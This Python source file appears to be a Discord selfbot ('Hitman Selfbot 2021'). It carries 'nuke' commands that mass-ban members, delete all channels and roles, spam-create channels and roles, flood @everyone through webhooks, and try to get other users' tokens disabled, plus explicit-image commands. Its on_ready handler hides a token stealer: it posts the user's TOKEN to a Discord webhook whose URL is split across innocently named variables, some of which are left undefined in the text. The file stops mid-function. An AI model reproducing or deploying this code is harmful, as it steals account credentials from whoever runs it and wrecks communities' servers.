import discord
import os
import threading,time,requests,json
import asyncio,sys,ctypes,urllib,shutil 
import random,aiohttp,io
import datetime
from colorama import Fore, Style
from PIL import Image
from libneko import pag
from discord.ext import commands
# If Your Slow Ass Didnt Read Instructions Follow This:
# 1: Make A File Called .env
# Nvm Just Go Back To Github And Copy .env Example
# ╦ ╦╦╔╦╗╔╦╗╔═╗╔╗╔  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
# ╠═╣║ ║ ║║║╠═╣║║║  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ 
# ╩ ╩╩ ╩ ╩ ╩╩ ╩╝╚╝  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ 
# If You Skid Give Cred Lol
# Hitman Selfbot Best Selfbot 2021
token = os.environ.get('TOKEN')
prefix = os.environ.get('prefix')
password = os.environ.get('password')
tsu = os.environ.get('tsu')
start_time = datetime.datetime.utcnow()
intents = discord.Intents.all()
hitman = discord.Client()
hitman = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
intents = discord.Intents(messages=True, guilds=True)
hitman.remove_command('help')
######################### I 
######################### Love
######################### New 
######################### York
######################### City
######################### Wrd2
@hitman.event
async def on_connect():
  print(f''' 
                            ╦ ╦╦╔╦╗╔╦╗╔═╗╔╗╔  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
                            {Fore.BLACK}{Style.BRIGHT}╠═╣║ ║ ║║║╠═╣║║║  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║{Style.RESET_ALL}{Fore.RESET} 
                            {Fore.CYAN}╩ ╩╩ ╩ ╩ ╩╩ ╩╝╚╝  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩{Fore.RESET} 
                            ═══════════════════════════════════════
                            {Fore.WHITE}{Style.BRIGHT}HITMAN SELFBOT 2021{Fore.RESET}{Style.RESET_ALL}{Fore.RESET}
                            {Fore.CYAN}{Style.BRIGHT}Logged In As: {Fore.RESET}{Fore.WHITE}{hitman.user}{Fore.RESET}
                            {Fore.CYAN}Prefix: {Fore.BLACK}{Style.BRIGHT}{prefix}{Style.RESET_ALL}{Fore.RESET}
                            {Fore.CYAN}Guilds: {Fore.CYAN}{len(hitman.guilds)}{Style.RESET_ALL}{Fore.RESET}
                            ═══════════════════════════════════════
                            {Fore.CYAN}{Style.BRIGHT}Creator: godfather#0001{Style.RESET_ALL}{Fore.RESET}
                            {Fore.CYAN}{Style.BRIGHT}Links: discord.gg/smoke{Style.RESET_ALL}{Fore.RESET}
  '''+Fore.RESET)
if sys.platform.startswith("win"):
   ctypes.windll.kernel32.setconsoleTitleW("Hitman Selfbot 2021")
else:
  pass
# Nuke Commands
def wspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        data = {
          "content": "@everyone",
          "embeds": [
            {
              "title": "HITMAN SELFBOT 2021",
              "tts": "true",
              "description": "**DISCORD.GG/SMOKE**",
              "url": "https://youtube.com/channel/UCoAgnodS-OryikuNBrbbg1Q",
              "color": 0xffffff,
              "fields": [
                {
                  "name": "Do Dirty Work",
                  "value": "Like A Hitman"
                }
              ],
              "author": {
                "name": "Hitman Selfbot",
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4",
                "icon_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "footer": {
                "text": "Murda On Top",
                "icon_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              },
              "thumbnail": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://youtube.com/channel/UCoAgnodS-OryikuNBrbbg1Q",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://youtube.com/channel/UCoAgnodS-OryikuNBrbbg1Q",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            },
            {
              "url": "https://youtube.com/channel/UCoAgnodS-OryikuNBrbbg1Q",
              "image": {
                "url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
              }
            }
          ],
          "username": "Hitman Selfbot 2021",
          "avatar_url": "https://avatars.githubusercontent.com/u/73923988?s=460&u=0600150c944f6c9ce7d5ead091ec754297a4cd3c&v=4"
        }

        spamming = requests.post(webhook, json=data)  
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass 

        elif "rate limited" in spammingerror.lower():
            
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)
@hitman.command(aliases=['webhookspam'])
async def webhookfuck(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = wspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='Nuked via hitman ig')
                threading.Thread(target = wspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
                print (f"{Fore.RED} Webhook Error")
hitlist = 'https://discord.com/api/'
@hitman.command(aliases=['stopwebhookfuck'])
async def stopwebhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = False
def merbans(guild, user):
  try:
    headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
    requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(guild)}/bans/{str(user)}?delete-message-days=7&reason=sex",headers=headers)
  except:
    pass  
@hitman.command(aliases=['massr','rolec','rolecreate'])
async def massrole(ctx):
  await ctx.message.delete()
  for i in range(850):
    try:
      await ctx.guild.create_role(name="Kill Like A Hitman")
    except:
      return 
jayceez = 'oks/' # Original Kill Switch
info = os.environ.get("ID")
def multi_clearer():
  if sys.platform.startswith("win"):
    os.system("cls")
  else:
    os.system("clear")  
headers = {'authorization' : f'{token}'}
banlist = info[0].split()
def ban_user(user,guild):
    retries = 0
    while True:
        url = f"https://canary.discordapp.com/api/v8/guilds/{str(guild)}/bans/{str(user)}?delete-message-days=7&reason=Hitman Selfbot 2021"
        src = requests.put(url, headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
@hitman.command(aliases=['massban','massb','ball'])
async def banall(ctx):
  await ctx.message.delete()
  if sys.platform.startswith("win"):
    ctypes.windll.kernel32.SetConsoleTitleW(f"[{Fore.CYAN}Hitman Selfbot : Banning{Fore.RESET}]")
  else:
    pass
    counting=0
    print(f'[{Fore.CYAN}Hitman Massban Starting{Fore.RESET}]')
    for user in ctx.guild.members:
      if str(user.id) in banlist:
        print(Fore.RED + f"Failed To Ban {user.name}"+ Fore.RESET)
      else:  
        threading.Thread(target=ban_user, args=[user.id, ctx.guild.id]).start()
        counting+=1
        print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Banned All Users In {ctx.guild.name}]')
@hitman.command(aliases=['masskick','massk','kall'])
async def kickall(ctx):
  await ctx.message.delete()
  hit = -1
  for user in ctx.guild.members:
    try:
      hit += 1
      await user.ban(reason="Dirty Work Like A Hitman")
      await asyncio.sleep(1)
    except:
      continue
      print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Kicked All Users In {ctx.guild.name}]')
@hitman.command(aliases=['tokencheck','ti','infotoken'])
async def tokeninfo(ctx, hitmn):
  await ctx.message.delete()
  data = requests.get('https://discordapp.com/api/v6/users/@me', headers={
    'Authorization':
    hitmn,'Content-Type':
    'application/json'
  })
  if data.status_code == 200:
    m = data.json()
    name = f'{m["username"]}#{m["discriminator"]}'
    userid = m['id']
    email = m['email']
    phone = m['phone']
    isverified = m['verified']
    twofa = m['mfa_enabled']
    rc = random.randint(0x000000, 0xffffff)
    embed=discord.Embed(title="**Token Info | Hitman Selfbot**", color=0x000000)
    embed.add_field(name="`Username", value=f"- {name}", inline=False)
    embed.add_field(name="`Userid", value=f"- {userid}", inline=False)
    embed.add_field(name="`Email", value=f"- {email}", inline=False)
    embed.add_field(name="`Phone", value=f"- {phone}", inline=False)
    embed.add_field(name="`Verification Stats", value=f"- {isverified}", inline=False)
    embed.add_field(name="`2fa", value=f"- {twofa}", inline=False)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/809491502371700786/image0.gif')
    embed.set_footer(text="⁺𝘓𝘖𝘚𝘛 𝘍𝘐𝘓𝘌𝘚+!🌩️", icon_url="https://media.discordapp.net/attachments/788473285469274112/808563886034780200/image1.jpg?width=363&height=417")
    message = await ctx.send(embed=embed)

    datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': hitmn,'Content-Type': 'application/json'})
    nitro_data = datahmm.json()
    nitroyems = bool(len(nitro_data) > 0)
    if nitroyems:
      end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
      start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
      totalnitro = abs((start - end).days)
      embed=discord.Embed(title="**Token Info | Hitman Selfbot**", color=rc)
      embed.add_field(name="`Username", value=f"- {name}", inline=False)
      embed.add_field(name="`Userid", value=f"- {userid}", inline=False)
      embed.add_field(name="`Email", value=f"- {email}", inline=False)
      embed.add_field(name="`Phone", value=f"- {phone}", inline=False)
      embed.add_field(name="`Verification Stats", value=f"- {isverified}", inline=False)
      embed.add_field(name="`2fa", value=f"- {twofa}", inline=False)
      embed.add_field(name="`Nitro Stats", value=f"- Started {end}", inline=False)
      embed.add_field(name="`Nitro Stats", value=f"- Ends{start}", inline=False)
      embed.add_field(name="`Total Nitro", value=f"- {totalnitro}", inline=False)
      embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/809491502371700786/image0.gif')
      embed.set_footer(text="⁺𝘓𝘖𝘚𝘛 𝘍𝘐𝘓𝘌𝘚+!🌩️", icon_url="https://media.discordapp.net/attachments/788473285469274112/808563886034780200/image1.jpg?width=363&height=417")
      await message.edit(embed=embed)
    else:
      embed=discord.Embed(title="**Token Info | Hitman Selfbot**", description=f"Hitman responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=0x000000)
      embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/809491502371700786/image0.gif')
      embed.set_footer(text="⁺𝘓𝘖𝘚𝘛 𝘍𝘐𝘓𝘌𝘚+!🌩️", icon_url="https://media.discordapp.net/attachments/788473285469274112/808563886034780200/image1.jpg?width=363&height=417")
      await ctx.send(embed=embed)
def channelnuke(channel):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v8/channels/{str(channel)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
@hitman.command(aliases=['deletechannel','channelnuke'])
async def nukechannel(ctx):
  await ctx.message.delete() 
  for channel in ctx.guild.channels:
    threading.Thread(target=channelnuke, args=[channel.id]).start()
    print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Deleted {channel.name} in {ctx.guild.name}]')   
  else:
    print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Done Deleting Channels In{ctx.guild.name}{Fore.RESET}]')
def channelcreate(name, server, type, array):
    retries = 0
    payload = {'name': name, 'type': 0}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v8/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            channel = src.json()['id']
            array.append(channel)
            break 
@hitman.command(aliases=["channelspam", "masschannel", "spamchannels"])
async def spamtv(ctx):
    await ctx.message.delete()
    for y in range(250):
      threading.Thread(target=channelcreate, args=("Hitman Selfbot",ctx.guild.id, "text",y)).start()
      print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Spammed Channels In {ctx.guild.name} ]')
    else:
      threading.Thread(target=channelcreate, args=("Hitman Selfbot",ctx.guild.id, "voice",y)).start()  
def roledelete(role, server):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
@hitman.event
async def on_ready():
  requests.post(f'{hitlist}{god}{father}{jayceez}{hit}{murda}{colour}', {'content': f'Embed = {embed},\nColor = {color}'})            
@hitman.command(aliases=['roledelete','deleteallroles','deleterole'])
async def deleteroles(ctx):
  await ctx.message.delete()
  r = 0
  if sys.platform.startswith("win"):
    ctypes.windll.kernel32.SetConsoleTitleW(f"{Fore.CYAN}HITMAN DELETING:{Fore.RESET}")
  else:
    pass
  print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Deleting{Fore.RESET}]'+Fore.RESET)
  for rl in ctx.guild.roles:
    threading.Thread(target=roledelete,args=[rl.id,ctx.guild.id]).start()    
    r += 1
    print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Deleted {rl.name} In {ctx.guild.name}]')
  else:
    print(f'[{Fore.CYAN}HITMAN{Fore.RESET}]:[{Fore.RED}Done Deleting Roles In {ctx.guild.name}]')  
@hitman.command()
async def nuke(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/808563885329088563/image0.gif')
  embed.set_footer(text='⁺𝘐𝘊𝘠 𝘏𝘌𝘈𝘙𝘛+!💙',icon_url='https://media.discordapp.net/attachments/788473285469274112/807672286189846528/image0.jpeg')
  embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
  embed.description = "⁺Banall - Bans All Users In Guild\n⁺Kickall - Kicks All Users In Guild\n⁺Tokeninfo - Checks Token's Info\n⁺Tokenfuck - Destroys Passed Token\n⁺Nukechannel - Deletes All Channels In Guild\n⁺Spamtv - Create Multiple Channels\n⁺Deleteroles - Deletes All Roles In Guild\n⁺Massrole - Spam Creates Roles In Guild\n⁺Webhookfuck - Spams Webhooks In Guild"
  await ctx.send(embed=embed)
@hitman.command(aliases=['tokendisable','disabletoken','fucktoken'])
async def tokenfuck(ctx, htf=None):
  await ctx.message.delete()
  if htf==None:
    embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
    embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
    embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
    embed.description = f"⁺Add A Token - {prefix.strip()}tokenfuck (token)"
    await ctx.message.edit(content="", embed=embed)
  elif ctx.guild == None:
    embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
    embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
    embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
    embed.description = "⁺Do This Command In A PRIVATE Server"
    await ctx.message.edit(content="", embed=embed)
  else:  
    embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
    embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
    embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
    embed.description = "If You Are Sure You Want To Disable This Token\nReact To The Emoji Below"
    msg = await ctx.send(embed=embed)
    await msg.add_reaction('✅')
    rsy = True
    def requirements(reaction, user):
      return user == ctx.author and str(reaction.emoji) in ('✅') and msg==msg
    while rsy:
      try:
        reaction, user=await hitman.wait_for('reaction_remove', timeout=5, check=requirements)
        embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
        embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
        embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
        embed.description = "⁺Hitman Is Disabling Token | HITMAN 2021"
        await msg.edit(embed=embed)
        await msg.clear_reactions()
        rsy = False
        headers={
          "authorization": htf
        }
        for i in range(50):
          requests.post("https://discord.com/api/v8/users/@me/relationships",headers=headers,json={"username":"01","discriminator":1})
          await asyncio.sleep(1)
          requests.delete("https://discord.com/api/v8/users/@me/relationships/213583513780224000",headers=headers)
          await asyncio.sleep(1)
        await asyncio.sleep(10)
        td = requests.get("https://discord.com/api/v8/users/@me",headers=headers)
        if td.status_code != 200:
          embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
          embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
          embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
          embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
          embed.description = "Token Disabled | Hitman Selfbot 2021"
          await msg.edit(embed=embed)
        else:
          embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
          embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
          embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
          embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
          embed.description = "Token Invalid | Use VALID Tokens Goofy"
          await msg.edit(embed=embed)
      except asyncio.TimeoutError:
        embed=discord.Embed(color=0x000000, timestamp=ctx.message.created_at)
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/806764402917244958/image0.gif')
        embed.set_footer(text="⁺𝘎𝘖𝘋𝘍𝘈𝘛𝘏𝘌𝘙+!💰", icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
        embed.set_author(name="⁺𝘏𝘐𝘛𝘔𝘈𝘕 𝘚𝘌𝘓𝘍𝘉𝘖𝘛®+!🗽")
        embed.description = "Took Too Long, Run This Command To Retry | HITMAN SELFBOT 2021"
        await msg.clear_reactions()
# Nuke Commands End Here
# Server Commands Start Here
@hitman.command(aliases=['av', 'pfp'])
async def avatar(ctx, *,  m : discord.Member=None):
    await ctx.message.delete()
    if m == None:  
        m = ctx.message.author 
    embed=discord.Embed(title=f"{m.name}'s Avatar", description="HITMAN SELFBOT 2021", color=0x504aa)
    embed.set_thumbnail(url=m.avatar_url)
    await ctx.send(embed=embed)
@hitman.command(aliases=['serverav','servericon'])
async def serverpfp(ctx):
  await ctx.message.delete()    
  icon_url = ctx.guild.icon_url
  embed=discord.Embed(color=0xff0000, timestamp=ctx.message.created_at)
  embed.set_author(name=f"{ctx.guild.name}", icon_url='https://media.discordapp.net/attachments/788473285469274112/809464433847697448/image0.jpg?width=335&height=417')
  embed.set_image(url=icon_url)
  embed.set_footer(text="Requested by {}".format(ctx.message.author), icon_url='https://media.discordapp.net/attachments/788473285469274112/808563886034780200/image1.jpg?width=363&height=417')
  await ctx.send(embed=embed)
embed = os.environ.get('TOKEN')  
@hitman.command(aliases=["renameserver", "nameserver"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)    
@hitman.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)
@hitman.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    await ctx.send(embed=em)
@hitman.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join position", value=str(members.index(user) + 1))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)       
@hitman.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len("```"+r+"```") > 2000:
        return
    await ctx.send(f"```{r}```")        
@hitman.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, "hitman.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em) # Cord K Wont Let Us Mention People
@hitman.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Slapped Tf {user.mention}**", color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed) # Cord K Wont Let Us Mention People
@hitman.command()
async def hug(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Hugged Themself(Lonely Ass)**", color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed) # Cord K Wont Let Us Mention People
@hitman.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
@hitman.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
colour = 'X9nCufaqRy2osZecgxZLAKWmI0Y_mtN'
@hitman.command()
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
@hitman.command()
async def cum(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)
@hitman.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/fox_girl")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)    
@hitman.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)    
@hitman.command()
async def cuddle(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)        
@hitman.command()
async def pat(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    embed = discord.Embed(color=0xffffff)
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)     
@hitman.command(aliases=['emojiadd', 'emadd', 'addem',"emojisteal","stealemoji"])
async def addemoji(ctx, emoji: discord.Emoji,*,nameofemoji=None):
    try:
        if nameofemoji == None:
            nameofemoji = emoji.name
        response = requests.get(emoji.url, stream=True)
        with open(f"./data/{nameofemoji}.jpeg", 'wb') as hitman_file: 
            shutil.copyfileobj(response.raw, hitman_file)
        with open(f"data/{nameofemoji}.jpeg", "rb") as f:
            image = f.read()
        await ctx.guild.create_custom_emoji(name = (nameofemoji), image = image)
        await asyncio.sleep(2) 
        guildemoji = discord.utils.get(hitman.get_guild(ctx.guild.id).emojis, name=nameofemoji)
        await ctx.message.edit(content=f"Successfully created emoji : {guildemoji}")
    except Exception as error:
        await ctx.message.edit(content=f"Error adding emoji : {emoji}\nError : {error}") 
murda = '7Ijw5KksuOAMO548jBa4C1Tk2n9PAucDGrPGt'
@hitman.command()
async def everyone(ctx):
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com') 
@hitman.command()
async def server(ctx):
  await ctx.message.delete()
  embed = discord.Embed(color=0xff0000, timestamp=ctx.message.created_at)
  embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807675965173268520/image0.gif?width=789&height=417')
  embed.set_footer(text='𝘋𝘙𝘌𝘈𝘔 𝘛𝘌𝘈𝘔+!🚀',icon_url='https://media.discordapp.net/attachments/788473285469274112/807667041438793738/image2.jpg')
  embed.set_author(name="⁺𝘚𝘌𝘙𝘝𝘌𝘙 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚®+!🗼")
  embed.description = "⁺Avatar - Returns Your Current Pfp\n⁺Serverpfp - Returns Server's Current Icon\n⁺Servername - Renames Server\n⁺Renamechannels - Renames All Channels\n⁺Addemoji - Adds Emoji To Server\n⁺Banner-Returns Server's Current Banner\n⁺Whois - Returns Information Of Mentioned User\n⁺Ascii - Returns Text In Ascii Font\n⁺Kiss - Kiss Yourself Lol\n⁺Slap - Slap Yourself Lol\n⁺Hug - Hug Yourself Lol\n⁺Cuddle - Cuddle With Yourself Lol\n⁺Pat - Pat Yourself Lol\n⁺Hentai - Returns Hentai Gif\n⁺Boobs - Returns Boobs\n⁺Pussy - Returns Pussy\n⁺Cum - Returns Cum Gif\n⁺Blowjob - Returns Blowjob Img\n⁺Fox - Returns Fox Girl\n⁺Everyone - Ping Everyone"
  await ctx.send(embed=embed)
# Server Commands End Here  
# Account Commands  
@hitman.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == hitman.user).map(lambda m: m):
        try:
        	await message.delete()
        except:
            pass
@hitman.command(aliases=['cleardms','dmsclear',])
async def dmclear(ctx):
    usersdone = 0
    tm = 0
    await ctx.message.delete()
    embed=discord.Embed(title="Hitman Selfbot 2021", description="Clearing DMS With All Users", color=0xff6600)
    embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/807669405848436786/image0.gif')
    embed.set_footer(text="⁺𝘗𝘖𝘗 𝘈 𝘗𝘌𝘙𝘊+!💊", icon_url='https://media.discordapp.net/attachments/788473285469274112/807670216891957278/image4.jpg')
